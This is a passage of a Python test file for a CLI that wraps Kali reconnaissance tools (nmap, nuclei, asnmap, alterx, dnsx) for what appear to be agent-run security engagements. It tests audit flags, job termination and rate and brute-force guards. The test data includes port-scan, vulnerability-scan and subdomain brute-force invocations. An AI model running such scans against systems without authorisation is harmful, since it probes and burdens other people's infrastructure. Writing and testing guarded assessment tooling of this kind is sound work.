        cli._hoist_root_flags(["kali", "subfinder", "--engagement-dir="])
    assert "empty" in str(exc.value)


def test_kali_job_start_validates_audit_metadata_and_resolves_agent(
    monkeypatch, fake_engagement
):
    """P1 #2: `kali job start` argparse must enforce the same audit-flag
    contract the typed verbs do (technique against TECHNIQUE_ENUM, intent
    length, probe-kind in PROBE_KIND_ENUM, phase in ALLOWED_PHASES, timeout
    optional but warned), and it must resolve agent name from $AGENT_NAME
    when --agent-name is omitted."""
    cli = _import("assess.cli")
    kali_jobs = _import("assess.lib.kali_jobs")
    monkeypatch.setenv("AGENT_NAME", "vulnerability-analyst")

    captured: dict = {}

    def fake_start_job(cmd, *, audit_meta, **kwargs):
        captured["cmd"] = list(cmd)
        captured["audit_meta"] = dict(audit_meta)
        captured["kwargs"] = dict(kwargs)
        return {"id": 7, "status": "running", "dtach_socket_path": "/tmp/x.sock"}

    mod = _import("assess.commands.kali_job")
    monkeypatch.setattr(mod, "start_job", fake_start_job)

    cli.main(
        [
            "--engagement-dir",
            str(fake_engagement),
            "kali",
            "job",
            "start",
            "--technique",
            "RECON",
            "--intent",
            "long sweep",
            "--probe-kind",
            "fingerprint",
            "--phase",
            "recon",
            "--timeout",
            "1200",
            "--target-host",
            "x.example.com",
            "--",
            "nuclei",
            "-l",
            "hosts.txt",
        ]
    )
    meta = captured["audit_meta"]
    assert meta["technique"] == "RECON"
    assert meta["intent"] == "long sweep"
    assert meta["probe_kind"] == "fingerprint"
    assert meta["phase"] == "recon"
    assert meta["timeout_seconds_requested"] == 1200
    assert meta["target_host"] == "x.example.com"
    assert meta["agent_name"] == "vulnerability-analyst"
    assert captured["kwargs"]["engagement_dir"] == fake_engagement.resolve()


def test_kali_job_start_warns_when_timeout_omitted(
    monkeypatch, fake_engagement, capsys
):
    """P1 #2: --timeout is optional but the helper emits a stderr warn so
    the operator notices they're using the 24h default."""
    cli = _import("assess.cli")
    monkeypatch.setenv("AGENT_NAME", "recon-specialist")

    def fake_start_job(cmd, *, audit_meta, **kwargs):
        return {"id": 1, "status": "running", "dtach_socket_path": "/tmp/y.sock"}

    mod = _import("assess.commands.kali_job")
    monkeypatch.setattr(mod, "start_job", fake_start_job)

    cli.main(
        [
            "--engagement-dir",
            str(fake_engagement),
            "kali",
            "job",
            "start",
            "--technique",
            "RECON",
            "--intent",
            "long sweep no timeout",
            "--probe-kind",
            "fingerprint",
            "--phase",
            "recon",
            "--",
            "nuclei",
            "-l",
            "hosts.txt",
        ]
    )
    err = capsys.readouterr().err
    assert "timeout" in err.lower() and "24h" in err.lower()


@pytest.mark.parametrize(
    ("argv", "helper_name", "expected_call"),
    [
        (["status", "7"], "job_status", {"job_id": 7}),
        (["tail", "7"], "job_tail", {"job_id": 7, "follow": False}),
        (["stop", "7"], "job_stop", {"job_id": 7, "container_name": "security-research"}),
        (["list", "--status", "running"], "job_list", {"status_value": "running", "parent_run_id": None}),
    ],
)
def test_kali_job_actions_thread_explicit_engagement_dir(
    monkeypatch, fake_engagement, capsys, argv, helper_name, expected_call
):
    """Every kali job action must use the explicit --engagement-dir root flag
    instead of falling back to cwd/env for backend engagement resolution."""
    cli = _import("assess.cli")
    mod = _import("assess.commands.kali_job")
    cfg = SimpleNamespace(
        base_url="http://127.0.0.1:18000",
        engagement_dir=str(fake_engagement),
        engagement_key=fake_engagement.name,
        agent_root=str(fake_engagement.parent.parent),
    )
    captured: dict = {}

    def fake_load_config(flag):
        captured["load_config_flag"] = flag
        return cfg

    monkeypatch.setattr(mod, "load_config", fake_load_config, raising=False)

    def fake_job_status(job_id, *, config=None):
        captured["call"] = {"job_id": job_id, "config": config}
        return {"id": job_id, "status": "running"}

    def fake_job_tail(job_id, *, follow=False, config=None):
        captured["call"] = {"job_id": job_id, "follow": follow, "config": config}

    def fake_job_stop(job_id, *, container_name="security-research", config=None):
        captured["call"] = {"job_id": job_id, "container_name": container_name, "config": config}
        return {"id": job_id, "status": "killed"}

    def fake_job_list(*, status_value=None, parent_run_id=None, config=None):
        captured["call"] = {"status_value": status_value, "parent_run_id": parent_run_id, "config": config}
        return [{"id": 7, "status": status_value or "running"}]

    monkeypatch.setattr(mod, "job_status", fake_job_status)
    monkeypatch.setattr(mod, "job_tail", fake_job_tail)
    monkeypatch.setattr(mod, "job_stop", fake_job_stop)
    monkeypatch.setattr(mod, "job_list", fake_job_list)

    cli.main(["--engagement-dir", str(fake_engagement), "kali", "job", *argv])

    assert captured["load_config_flag"] == str(fake_engagement)
    call = captured["call"]
    assert call.pop("config") is cfg
    assert call == expected_call
    if argv[0] != "tail":
        assert capsys.readouterr().out


def test_kali_job_start_rejects_unknown_technique(monkeypatch, fake_engagement):
    """P1 #2: argparse choices reject unknown techniques before start_job runs."""
    cli = _import("assess.cli")
    monkeypatch.setenv("AGENT_NAME", "recon-specialist")
    with pytest.raises(SystemExit) as exc:
        cli.main(
            [
                "--engagement-dir",
                str(fake_engagement),
                "kali",
                "job",
                "start",
                "--technique",
                "MADE-UP-NOT-IN-ENUM",
                "--intent",
                "x",
                "--probe-kind",
                "fingerprint",
                "--phase",
                "recon",
                "--timeout",
                "60",
                "--",
                "nuclei",
            ]
        )
    assert exc.value.code != 0


def test_kali_job_stop_terminates_with_sigterm_then_sigkill(
    monkeypatch, fake_engagement
):
    """P1 #3: stop must SIGTERM, wait, SIGKILL if needed, and only PATCH
    `status=killed` once the in-container PID is confirmed dead."""
    kali_jobs = _import("assess.lib.kali_jobs")
    monkeypatch.setattr(
        kali_jobs,
        "load_config",
        lambda flag: SimpleNamespace(
            base_url="http://127.0.0.1:18000",
            engagement_dir=str(fake_engagement),
            engagement_key=fake_engagement.name,
            agent_root=str(fake_engagement.parent.parent),
        ),
    )

    class _StopClient(_FakeClient):
        def get(self, endpoint):
            return {"id": 22, "dtach_socket_path": "/tmp/aith-jobs/abc.sock"}

        def patch(self, endpoint, payload, *, accept_409: bool = False):
            self.patches.append((endpoint, payload))
            return {"id": 22, "status": payload["status"]}

    fake_client = _StopClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali_jobs, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali_jobs, "_container_running", lambda name: True)
    monkeypatch.setattr(kali_jobs, "_read_job_pid", lambda *a, **k: 9999)

    # PID alive on first three checks (SIGTERM grace), dead on the fourth
    # (after SIGTERM is delivered for the 4th poll). Mix in a SIGKILL.
    alive_calls = {"n": 0}

    def fake_alive(container, pid):
        alive_calls["n"] += 1
        # After 2 polls under SIGTERM, the process is dead.
        return alive_calls["n"] <= 2

    monkeypatch.setattr(kali_jobs, "_job_pid_alive", fake_alive)

    signals_sent: list[str] = []

    def fake_signal(container, pid, sig):
        signals_sent.append(sig)

    monkeypatch.setattr(kali_jobs, "_signal_job_pid", fake_signal)
    # Avoid sleeping in the poll loop.
    monkeypatch.setattr(kali_jobs.time, "sleep", lambda _: None)

    record = kali_jobs.job_stop(22, container_name="security-research")
    assert record["status"] == "killed"
    assert "TERM" in signals_sent
    assert ("jobs/22", {"status": "killed"}) in fake_client.patches


def test_kali_job_stop_escalates_to_sigkill_when_sigterm_ignored(
    monkeypatch, fake_engagement
):
    """P1 #3: when SIGTERM doesn't kill the process inside the 10s grace,
    the helper escalates to SIGKILL."""
    kali_jobs = _import("assess.lib.kali_jobs")
    monkeypatch.setattr(
        kali_jobs,
        "load_config",
        lambda flag: SimpleNamespace(
            base_url="http://127.0.0.1:18000",
            engagement_dir=str(fake_engagement),
            engagement_key=fake_engagement.name,
            agent_root=str(fake_engagement.parent.parent),
        ),
    )

    class _StopClient(_FakeClient):
        def get(self, endpoint):
            return {"id": 23, "dtach_socket_path": "/tmp/aith-jobs/def.sock"}

        def patch(self, endpoint, payload, *, accept_409: bool = False):
            self.patches.append((endpoint, payload))
            return {"id": 23, "status": payload["status"]}

    fake_client = _StopClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali_jobs, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali_jobs, "_container_running", lambda name: True)
    monkeypatch.setattr(kali_jobs, "_read_job_pid", lambda *a, **k: 4242)

    # Compress the wait loop: signal SIGTERM never lands → keep returning alive
    # until a SIGKILL is sent, then go dead.
    state = {"sigkill_sent": False}

    def fake_alive(container, pid):
        return not state["sigkill_sent"]

    def fake_signal(container, pid, sig):
        if sig == "KILL":
            state["sigkill_sent"] = True

    monkeypatch.setattr(kali_jobs, "_job_pid_alive", fake_alive)
    monkeypatch.setattr(kali_jobs, "_signal_job_pid", fake_signal)
    # Compress timeouts so the 10s SIGTERM grace doesn't drag the test out.
    real_monotonic = kali_jobs.time.monotonic
    fake_clock = {"now": real_monotonic()}

    def fast_monotonic():
        fake_clock["now"] += 100  # leap forward each call → always past deadline
        return fake_clock["now"]

    monkeypatch.setattr(kali_jobs.time, "monotonic", fast_monotonic)
    monkeypatch.setattr(kali_jobs.time, "sleep", lambda _: None)

    record = kali_jobs.job_stop(23, container_name="security-research")
    assert record["status"] == "killed"


def test_kali_job_stop_records_stop_failed_when_sigkill_also_fails(
    monkeypatch, fake_engagement
):
    """P1 #3: if the process is still alive after SIGKILL the helper PATCHes
    `status=stop_failed` and surfaces the error to the caller."""
    kali_jobs = _import("assess.lib.kali_jobs")
    monkeypatch.setattr(
        kali_jobs,
        "load_config",
        lambda flag: SimpleNamespace(
            base_url="http://127.0.0.1:18000",
            engagement_dir=str(fake_engagement),
            engagement_key=fake_engagement.name,
            agent_root=str(fake_engagement.parent.parent),
        ),
    )

    class _StopClient(_FakeClient):
        def get(self, endpoint):
            return {"id": 24, "dtach_socket_path": "/tmp/aith-jobs/zzz.sock"}

        def patch(self, endpoint, payload, *, accept_409: bool = False):
            self.patches.append((endpoint, payload))
            return {"id": 24, "status": payload["status"]}

    fake_client = _StopClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali_jobs, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali_jobs, "_container_running", lambda name: True)
    monkeypatch.setattr(kali_jobs, "_read_job_pid", lambda *a, **k: 9000)
    monkeypatch.setattr(kali_jobs, "_job_pid_alive", lambda *a, **k: True)
    monkeypatch.setattr(kali_jobs, "_signal_job_pid", lambda *a, **k: None)

    # Force the wait loop to exit immediately on each call.
    real_monotonic = kali_jobs.time.monotonic
    fake_clock = {"now": real_monotonic()}

    def fast_monotonic():
        fake_clock["now"] += 100
        return fake_clock["now"]

    monkeypatch.setattr(kali_jobs.time, "monotonic", fast_monotonic)
    monkeypatch.setattr(kali_jobs.time, "sleep", lambda _: None)

    from assess.lib.client import AssessError

    with pytest.raises(AssessError) as exc:
        kali_jobs.job_stop(24, container_name="security-research")
    assert "stop_failed" in str(exc.value)
    # The PATCH still landed with stop_failed so the operator sees the row.
    assert ("jobs/24", {"status": "stop_failed"}) in fake_client.patches


def test_finalize_409_swallowed_as_success(monkeypatch, fake_engagement):
    """P1 #4: a 409 from the finalize PATCH is a success signal carrying the
    canonical row payload — `_patch_finalize` must return that row instead
    of raising AssessError. The "may need orphan sweep" warning must NOT
    fire on the 409 path."""
    kali = _setup_fake_config(monkeypatch, fake_engagement)
    fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)

    canonical_row = {
        "id": 7,
        "status": "completed",
        "return_code": 0,
        "duration_ms": 5000,
        "noop": True,
    }

    def fake_patch(endpoint, payload, *, accept_409=False):
        # Mirror the AssessmentClient contract: when accept_409 is set and
        # the backend says 409, return the canonical row from `existing`.
        assert accept_409 is True
        fake_client.patches.append((endpoint, payload))
        return {**canonical_row, "finalize_409": True}

    fake_client.patch = fake_patch  # type: ignore[assignment]
    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
    monkeypatch.setattr(
        kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0)
    )

    result = kali.kali_exec(
        ["nmap", "-sV", "10.0.0.1"],
        technique="RECON",
        intent="409 race",
        probe_kind="fingerprint",
        phase="recon",
        timeout=60,
        agent_name="recon-specialist",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
        tool_name="nmap",
    )
    assert result.status == "completed"


def test_assessment_client_patch_accept_409_returns_canonical_row(monkeypatch):
    """P1 #4 (client-level): AssessmentClient.patch(accept_409=True) must
    treat HTTP 409 as success and unwrap `detail.existing` so the caller
    receives the canonical row."""
    from assess.lib import client as client_mod

    captured: list = []

    def fake_request(self, method, path, body=None, **kwargs):
        captured.append((method, path, kwargs))
        return 409, json.dumps(
            {
                "detail": {
                    "message": "already finalized",
                    "existing": {
                        "id": 99,
                        "status": "completed",
                        "return_code": 0,
                        "noop": True,
                    },
                }
            }
        )

    monkeypatch.setattr(client_mod.AssessmentClient, "_request", fake_request)
    c = client_mod.AssessmentClient("http://127.0.0.1:18000", "engagement-key")
    row = c.patch("command-runs/99/finalize", {"status": "completed"}, accept_409=True)
    assert row["id"] == 99
    assert row["status"] == "completed"
    assert row.get("finalize_409") is True
    assert captured[0][2]["accept_409"] is True


def test_assessment_client_connection_failure_suggests_orchestrator(monkeypatch):
    from assess.lib import client as client_mod

    c = client_mod.AssessmentClient("http://127.0.0.1:18000", "engagement-key")

    def fail_conn(*_args, **_kwargs):
        raise OSError("connection refused")

    monkeypatch.setattr(c, "_get_conn", fail_conn)

    with pytest.raises(client_mod.AssessError) as exc_info:
        c.get("summary")

    message = str(exc_info.value)
    assert "aith orchestrator status" in message
    assert "aith orchestrator start" in message
    assert "not the Kali runtime" in message


def test_pre_exec_wrapper_handles_pid_write_failure(monkeypatch, fake_engagement):
    """P1 narrowing: the wrapper must succeed-or-log-and-still-exec so a
    failed pid-file write (ENOSPC / read-only /tmp) doesn't strand the user
    command. The wrapper shape is `echo $$ > pid && exec "$@" || (echo ...; exec "$@")`."""
    kali = _setup_fake_config(monkeypatch, fake_engagement)
    fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)

    captured: dict = {}

    def fake_popen(argv, **kwargs):
        captured["argv"] = argv
        return _FakePopen(returncode=0)

    monkeypatch.setattr(kali.subprocess, "Popen", fake_popen)

    kali.kali_exec(
        ["nmap", "-sV", "10.0.0.1"],
        technique="RECON",
        intent="pid-write race fix shape",
        probe_kind="fingerprint",
        phase="recon",
        timeout=30,
        agent_name="recon-specialist",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
        tool_name="nmap",
    )
    argv = captured["argv"]
    container_index = argv.index("security-research")
    wrapper = argv[container_index + 3]
    # Both happy and failure paths exec the user command.
    assert wrapper.count('exec "$@"') == 2
    assert "&& exec" in wrapper
    assert "PID write to" in wrapper


# ──────────────────────────────────────────────────────────────────────────
# Wave 2 — methodology + wrapper alignment
# ──────────────────────────────────────────────────────────────────────────


def test_kali_root_help_lists_asnmap():
    """F3 — `kali asnmap` is a registered typed verb (the SKILL mandates it)."""
    cli = _import("assess.cli")
    with pytest.raises(SystemExit):
        cli.main(["kali", "--help"])


def test_required_flag_enforcement_asnmap():
    """F3 — argparse round-trip: asnmap rejects a call missing the audit lifecycle flags."""
    cli = _import("assess.cli")
    with pytest.raises(SystemExit) as exc:
        cli.main(["kali", "asnmap", "-d", "example.com"])
    assert exc.value.code != 0


def test_asnmap_translates_argv(monkeypatch):
    """F3 — `kali asnmap -d <domain> -silent -o <file>` lands as `asnmap -d ... -silent -o ...`
    on the wrapped command argv.
    """
    cli = _import("assess.cli")
    kali = _import("assess.lib.kali")

    captured: dict = {}

    def fake_kali_exec(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        captured["kwargs"] = kwargs
        return kali.KaliResult(
            run_id=1,
            status="completed",
            return_code=0,
            stdout_path="/tmp/x.out",
            stderr_path="/tmp/x.err",
            duration_ms=10,
            peak_rss_bytes=None,
            stdout_preview="",
            stderr_preview="",
            timed_out=False,
            partial_results=False,
        )

    mod = _import("assess.commands.kali_asnmap")
    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)

    cli.main(
        [
            "kali",
            "asnmap",
            "-d",
            "example.com",
            "-silent",
            "-o",
            "/engagements/x/scans/cidrs.txt",
            "--technique",
            "OSINT",
            "--intent",
            "ASN→CIDR mapping for example.com",
            "--probe-kind",
            "fingerprint",
            "--phase",
            "recon",
            "--timeout",
            "300",
        ]
    )
    cmd = captured["cmd"]
    assert cmd[0] == "asnmap"
    assert "-d" in cmd and "example.com" in cmd
    assert "-silent" in cmd
    assert "-o" in cmd and "/engagements/x/scans/cidrs.txt" in cmd
    assert captured["kwargs"]["tool_name"] == "asnmap"


def test_asnmap_requires_target_or_list(capsys):
    """F3 — asnmap.run rejects calls without -d / -l / -asn / -org. The CLI
    catches AssessError and exits non-zero; the stderr message names the
    missing flag set so the operator can fix it."""
    cli = _import("assess.cli")

    with pytest.raises(SystemExit) as exc:
        cli.main(
            [
                "kali",
                "asnmap",
                "--technique",
                "OSINT",
                "--intent",
                "missing-target test",
                "--probe-kind",
                "fingerprint",
                "--phase",
                "recon",
                "--timeout",
                "60",
            ]
        )
    assert exc.value.code != 0
    err = capsys.readouterr().err
    assert "asnmap" in err
    assert "-d" in err or "-l" in err


@pytest.mark.parametrize(
    "ports_value",
    ["top-100", "top-1000", "full", "80,443", "22,80,443,8000-8100"],
)
def test_nmap_ports_accepts_documented_shapes(monkeypatch, ports_value):
    """F1 — every `--ports <value>` shape documented in the recon skills must
    parse cleanly. Skill examples use `top-1000`, `full`, explicit lists, and
    range syntax; a wrapper that rejects any of these breaks the methodology.
    """
    cli = _import("assess.cli")
    kali = _import("assess.lib.kali")

    def fake_kali_exec(cmd, **kwargs):
        return kali.KaliResult(
            run_id=1,
            status="completed",
            return_code=0,
            stdout_path="/tmp/x.out",
            stderr_path="/tmp/x.err",
            duration_ms=10,
            peak_rss_bytes=None,
            stdout_preview="",
            stderr_preview="",
            timed_out=False,
            partial_results=False,
        )

    mod = _import("assess.commands.kali_nmap")
    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)

    cli.main(
        [
            "kali",
            "nmap-scan",
            "--target",
            "10.0.0.1",
            "--ports",
            ports_value,
            "--technique",
            "RECON",
            "--intent",
            f"ports={ports_value} parse smoke",
            "--probe-kind",
            "fingerprint",
            "--phase",
            "recon",
            "--timeout",
            "600",
        ]
    )


def test_nmap_accepts_input_list_without_target(monkeypatch):
    """`-iL <file>` is a complete nmap target source; the wrapper must not
    force an extra positional target that changes scan scope."""
    cli = _import("assess.cli")
    kali = _import("assess.lib.kali")

    captured: dict = {}

    def fake_kali_exec(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        captured["kwargs"] = kwargs
        return kali.KaliResult(
            run_id=1,
            status="completed",
            return_code=0,
            stdout_path="/tmp/x.out",
            stderr_path="/tmp/x.err",
            duration_ms=10,
            peak_rss_bytes=None,
            stdout_preview="",
            stderr_preview="",
            timed_out=False,
            partial_results=False,
        )

    mod = _import("assess.commands.kali_nmap")
    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)

    cli.main(
        [
            "kali",
            "nmap-scan",
            "-iL",
            "/engagements/x/scans/hosts.txt",
            "--ports",
            "top-100",
            "--technique",
            "RECON",
            "--intent",
            "batch scan host list",
            "--probe-kind",
            "fingerprint",
            "--phase",
            "recon",
            "--timeout",
            "600",
        ]
    )

    assert captured["cmd"] == [
        "nmap",
        "-iL",
        "/engagements/x/scans/hosts.txt",
        "--top-ports",
        "100",
    ]


def test_nmap_requires_target_or_input_list(capsys):
    """The wrapper still rejects targetless scans when neither --target nor
    -iL names the target source."""
    cli = _import("assess.cli")

    with pytest.raises(SystemExit) as exc:
        cli.main(
            [
                "kali",
                "nmap-scan",
                "--technique",
                "RECON",
                "--intent",
                "missing target source",
                "--probe-kind",
                "fingerprint",
                "--phase",
                "recon",
                "--timeout",
                "600",
            ]
        )

    assert exc.value.code != 0
    err = capsys.readouterr().err
    assert "--target" in err
    assert "-iL" in err


def test_nmap_scan_type_rejects_legacy_pseudo_values():
    """F1 — `--scan-type top-1000`, `full-tcp`, `udp-top`, `targeted`, `ports-only`
    were drift values from older skill text. The wrapper restricts `--scan-type`
    to nmap technique flags (sS/sT/sU/sV/sn). Pseudo-values must fail argparse
    so the methodology stays honest about which knob is which."""
    cli = _import("assess.cli")
    for legacy in ("top-1000", "full-tcp", "udp-top", "targeted", "ports-only"):
        with pytest.raises(SystemExit):
            cli.main(
                [
                    "kali",
                    "nmap-scan",
                    "--target",
                    "10.0.0.1",
                    "--scan-type",
                    legacy,
                    "--technique",
                    "RECON",
                    "--intent",
                    "drift-value rejection",
                    "--probe-kind",
                    "fingerprint",
                    "--phase",
                    "recon",
                    "--timeout",
                    "600",
                ]
            )


def test_alterx_estimate_flag_appended(monkeypatch):
    """F5 — `kali alterx -enrich -estimate` carries the `-estimate` toggle
    through to the underlying alterx invocation."""
    cli = _import("assess.cli")
    kali = _import("assess.lib.kali")

    captured: dict = {}

    def fake_kali_exec(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        return kali.KaliResult(
            run_id=1,
            status="completed",
            return_code=0,
            stdout_path="/tmp/x.out",
            stderr_path="/tmp/x.err",
            duration_ms=10,
            peak_rss_bytes=None,
            stdout_preview="",
            stderr_preview="",
            timed_out=False,
            partial_results=False,
        )

    mod = _import("assess.commands.kali_alterx")
    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)

    cli.main(
        [
            "kali",
            "alterx",
            "-l",
            "/engagements/x/scans/subs_passive.txt",
            "-enrich",
            "-estimate",
            "--technique",
            "RECON",
            "--intent",
            "alterx estimate-first",
            "--probe-kind",
            "fingerprint",
            "--phase",
            "recon",
            "--timeout",
            "120",
        ]
    )
    cmd = captured["cmd"]
    assert "-estimate" in cmd
    assert "-en" in cmd  # -enrich shorthand


def test_alterx_domain_mode_uses_dash_d(monkeypatch):
    """Single-domain alterx mode must pass `-d <domain>` to alterx; `-l`
    is the list-file flag and treats the domain string as a path."""
    cli = _import("assess.cli")
    kali = _import("assess.lib.kali")

    captured: dict = {}

    def fake_kali_exec(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        return kali.KaliResult(
            run_id=1,
            status="completed",
            return_code=0,
            stdout_path="/tmp/x.out",
            stderr_path="/tmp/x.err",
            duration_ms=10,
            peak_rss_bytes=None,
            stdout_preview="",
            stderr_preview="",
            timed_out=False,
            partial_results=False,
        )

    mod = _import("assess.commands.kali_alterx")
    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)

    cli.main(
        [
            "kali",
            "alterx",
            "-d",
            "example.com",
            "--technique",
            "RECON",
            "--intent",
            "alterx domain mode",
            "--probe-kind",
            "fingerprint",
            "--phase",
            "recon",
            "--timeout",
            "120",
        ]
    )
    assert captured["cmd"][:3] == ["alterx", "-d", "example.com"]


def _patch_dnsx_exec(monkeypatch):
    cli = _import("assess.cli")
    kali = _import("assess.lib.kali")

    captured: dict = {}

    def fake_kali_exec(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        return kali.KaliResult(
            run_id=1,
            status="completed",
            return_code=0,
            stdout_path="/tmp/x.out",
            stderr_path="/tmp/x.err",
            duration_ms=10,
            peak_rss_bytes=None,
            stdout_preview="",
            stderr_preview="",
            timed_out=False,
            partial_results=False,
        )

    mod = _import("assess.commands.kali_dnsx")
    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
    return cli, captured


def _dnsx_base_argv(*extra: str) -> list[str]:
    return [
        "kali",
        "dnsx",
        *extra,
        "--technique",
        "RECON",
        "--intent",
        "polite-CDN-fronted-target dnsx profile",
        "--probe-kind",
        "fingerprint",
        "--phase",
        "recon",
        "--timeout",
        "1800",
    ]


def test_dnsx_defaults_to_docker_safe_tcp_profile(monkeypatch):
    """dnsx gets conservative runtime defaults when operators omit tuning flags."""
    cli, captured = _patch_dnsx_exec(monkeypatch)

    cli.main(_dnsx_base_argv("-l", "/engagements/x/scans/cands.txt"))

    cmd = captured["cmd"]
    assert cmd[0] == "dnsx"
    assert cmd[cmd.index("-r") + 1] == "tcp:1.1.1.1,tcp:8.8.8.8"
    assert cmd[cmd.index("-rl") + 1] == "100"
    assert cmd[cmd.index("-t") + 1] == "20"
    assert cmd[cmd.index("-retry") + 1] == "3"
    assert cmd[cmd.index("-timeout") + 1] == "5"


def test_dnsx_help_explains_profiles_opt_ins_and_extra_args(capsys):
    cli = _import("assess.cli")

    with pytest.raises(SystemExit) as exc:
        cli.main(["kali", "dnsx", "--help"])

    assert exc.value.code == 0
    out = capsys.readouterr().out
    assert "default polite-cdn" in out
    assert "--allow-bruteforce" in out
    assert "--allow-bulk-json" in out
    assert "--allow-unsafe-rate" in out
    assert "Use typed flags for guarded knobs" in out
    assert "--extra-args='-trace -stats'" in out
    assert "-rcode noerror" in out


def test_dnsx_common_record_filter_flags_are_typed(monkeypatch):
    cli, captured = _patch_dnsx_exec(monkeypatch)

    cli.main(
        _dnsx_base_argv(
            "-l",
            "/engagements/x/scans/cands.txt",
            "-aaaa",
            "-mx",
            "-txt",
            "-ns",
            "-soa",
            "-ptr",
            "-asn",
            "-cdn",
            "-rcode",
            "noerror,servfail",
            "-wd",
            "example.com",
            "-omit-raw",
        )
    )

    cmd = captured["cmd"]
    for flag in ("-aaaa", "-mx", "-txt", "-ns", "-soa", "-ptr", "-asn", "-cdn", "-omit-raw"):
        assert flag in cmd
    assert cmd[cmd.index("-rcode") + 1] == "noerror,servfail"
    assert cmd[cmd.index("-wd") + 1] == "example.com"


def test_dnsx_timeout_flag_passes_through(monkeypatch):
    """F6 — `kali dnsx -timeout 5` translates to dnsx `-timeout 5`."""
    cli, captured = _patch_dnsx_exec(monkeypatch)

    cli.main(
        _dnsx_base_argv(
            "-l",
            "/engagements/x/scans/cands.txt",
            "-rl",
            "100",
            "-t",
            "20",
            "-retry",
            "3",
            "-timeout",
            "5",
        )
    )
    cmd = captured["cmd"]
    assert cmd[0] == "dnsx"
    # `-timeout 5` for dnsx must appear (NOT collapsed into the audit `--timeout`).
    idx = cmd.index("-timeout")
    assert cmd[idx + 1] == "5"


def test_dnsx_rejects_unsafe_rate_without_opt_in(monkeypatch, capsys):
    """High dnsx rates need an explicit opt-in because Docker UDP churn is host-side."""
    cli, _captured = _patch_dnsx_exec(monkeypatch)

    with pytest.raises(SystemExit) as exc:
        cli.main(_dnsx_base_argv("-l", "/engagements/x/scans/cands.txt", "-rl", "600"))

    assert exc.value.code != 0
    err = capsys.readouterr().err
    assert "--allow-unsafe-rate" in err
    assert "bursty-ok" in err


def test_dnsx_bursty_profile_sets_documented_ceiling(monkeypatch):
    """bursty-ok is available only as an explicit profile selection."""
    cli, captured = _patch_dnsx_exec(monkeypatch)

    cli.main(
        _dnsx_base_argv(
            "-l",
            "/engagements/x/scans/cands.txt",
            "--dnsx-profile",
            "bursty-ok",
        )
    )

    cmd = captured["cmd"]
    assert cmd[cmd.index("-rl") + 1] == "500"
    assert cmd[cmd.index("-t") + 1] == "100"


def test_dnsx_response_modes_are_mutually_exclusive(monkeypatch):
    """dnsx cannot emit both full responses and response-only output in one typed call."""
    cli, _captured = _patch_dnsx_exec(monkeypatch)

    with pytest.raises(SystemExit):
        cli.main(
            _dnsx_base_argv(
                "-l",
                "/engagements/x/scans/cands.txt",
                "-resp",
                "-resp-only",
            )
        )


def test_dnsx_requires_bruteforce_opt_in(monkeypatch, capsys):
    """dnsx -w is active enumeration, so the wrapper requires deliberate operator intent."""
    cli, _captured = _patch_dnsx_exec(monkeypatch)

    with pytest.raises(SystemExit) as exc:
        cli.main(_dnsx_base_argv("-d", "example.com", "-w", "/lists/subs.txt"))

    assert exc.value.code != 0
    assert "--allow-bruteforce" in capsys.readouterr().err


def test_dnsx_allows_bruteforce_with_opt_in(monkeypatch):
    cli, captured = _patch_dnsx_exec(monkeypatch)

    cli.main(
        _dnsx_base_argv(
            "-d",
            "example.com",
            "-w",
            "/lists/subs.txt",
            "--allow-bruteforce",
        )
    )

    cmd = captured["cmd"]
    assert cmd[cmd.index("-w") + 1] == "/lists/subs.txt"


def test_dnsx_bulk_json_response_guard_uses_local_line_count(monkeypatch, tmp_path, capsys):
    cli, _captured = _patch_dnsx_exec(monkeypatch)
    target_list = tmp_path / "many-subs.txt"
    target_list.write_text("".join(f"sub{i}.example.com\n" for i in range(1001)))

    with pytest.raises(SystemExit) as exc:
        cli.main(_dnsx_base_argv("-l", str(target_list), "-resp", "-json"))

    assert exc.value.code != 0
    err = capsys.readouterr().err
    assert "--allow-bulk-json" in err


def test_dnsx_bulk_json_response_requires_opt_in_when_list_size_unknown(monkeypatch, capsys):
    cli, _captured = _patch_dnsx_exec(monkeypatch)

    with pytest.raises(SystemExit) as exc:
        cli.main(_dnsx_base_argv("-l", "/engagements/x/scans/survivors.txt", "-resp", "-json"))

    assert exc.value.code != 0
    err = capsys.readouterr().err
    assert "--allow-bulk-json" in err
    assert "cannot be verified" in err


def test_dnsx_allows_small_local_response_json_list(monkeypatch, tmp_path):
    cli, captured = _patch_dnsx_exec(monkeypatch)
    target_list = tmp_path / "small-subs.txt"
    target_list.write_text("one.example.com\ntwo.example.com\n")

    cli.main(_dnsx_base_argv("-l", str(target_list), "-resp", "-json"))

    cmd = captured["cmd"]
    assert "-resp" in cmd
    assert "-json" in cmd


def test_dnsx_rejects_guarded_extra_args(monkeypatch, capsys):
    cli, _captured = _patch_dnsx_exec(monkeypatch)

    with pytest.raises(SystemExit) as exc:
        cli.main(_dnsx_base_argv("-l", "/engagements/x/scans/cands.txt", "--extra-args=-rl 1000"))

    assert exc.value.code != 0
    err = capsys.readouterr().err
    assert "--extra-args" in err
